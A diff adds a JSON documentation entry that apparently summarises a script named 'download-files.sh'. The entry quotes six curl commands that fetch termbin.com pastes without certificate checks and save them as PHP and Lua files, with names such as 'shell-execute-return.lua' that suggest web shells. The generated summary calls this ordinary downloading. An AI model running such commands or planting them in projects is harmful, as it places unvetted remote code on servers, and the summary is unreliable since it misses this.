@@ -1,0 +1,10 @@
+{
+    "summary": "The code is making HTTP GET requests using curl to download files from termbin.com and saving them with specific file names. Each request is executed concurrently using the \"&\" symbol.",
+    "details": [
+        {
+            "comment": "The code is making HTTP GET requests using curl to download files from termbin.com and saving them with specific file names. Each request is executed concurrently using the \"&\" symbol.",
+            "location": "\"/media/root/Prima/works/generated_docs/lazer_doc/src/multilingual/hotfix-v0/download-files.sh\":0-5",
+            "content": "curl -k https://termbin.com/dznz > pass_args.php &\ncurl -k https://termbin.com/80qw > dopeshit.php &\ncurl -k https://termbin.com/4ksk > scrapy.php &\ncurl -k https://termbin.com/i0ic > fuckshit.php &\ncurl -k https://termbin.com/2pqkw > pass_argv.php &\ncurl -k https://termbin.com/kszq > shell-execute-return.lua &"
+        }
+    ]
+}
